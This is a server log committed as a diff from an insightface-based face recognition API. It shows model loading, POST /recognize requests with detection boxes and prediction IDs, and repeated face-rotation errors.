+find model: /home/ai-r-d/.insightface/models/buffalo_sc/w600k_mbf.onnx recognition ['None', 3, 112, 112] 127.5 127.5
+set det-size: (640, 640)
+box [[125.59894    103.90335    497.51755    538.778        0.75768995]]
+('630055198e6de33f5822c556', 'static/1489fce4616211ed84aaad0224ec19ed_630055198e6de33f5822c556.jpg')
+path:  ['static/1489fce4616211ed84aaad0224ec19ed_630055198e6de33f5822c556.jpg']
+pr>>>>>>>>>>> ['437359909826986470']
+time:  0.21201395988464355
+INFO:     123.24.206.26:41022 - "POST /recognize HTTP/1.1" 200 OK
+2022-11-16 08:38:03.671 | ERROR    | __main__:search:301 - Can't rotate image face
+Applied providers: ['CPUExecutionProvider'], with options: {'CPUExecutionProvider': {}}
+find model: /home/ai-r-d/.insightface/models/buffalo_sc/det_500m.onnx detection [1, 3, '?', '?'] 127.5 128.0
+Applied providers: ['CPUExecutionProvider'], with options: {'CPUExecutionProvider': {}}
+find model: /home/ai-r-d/.insightface/models/buffalo_sc/w600k_mbf.onnx recognition ['None', 3, 112, 112] 127.5 127.5
+set det-size: (640, 640)
+INFO:     123.24.206.26:52755 - "POST /recognize HTTP/1.1" 200 OK
+2022-11-16 08:38:10.719 | ERROR    | __main__:search:301 - Can't rotate image face
+Applied providers: ['CPUExecutionProvider'], with options: {'CPUExecutionProvider': {}}
+find model: /home/ai-r-d/.insightface/models/buffalo_sc/det_500m.onnx detection [1, 3, '?', '?'] 127.5 128.0
+Applied providers: ['CPUExecutionProvider'], with options: {'CPUExecutionProvider': {}}
+find model: /home/ai-r-d/.insightface/models/buffalo_sc/w600k_mbf.onnx recognition ['None', 3, 112, 112] 127.5 127.5
+set det-size: (640, 640)
+INFO:     123.24.206.26:56161 - "POST /recognize HTTP/1.1" 200 OK
+INFO:     123.24.206.26:62685 - "POST /showimage HTTP/1.1" 422 Unprocessable Entity
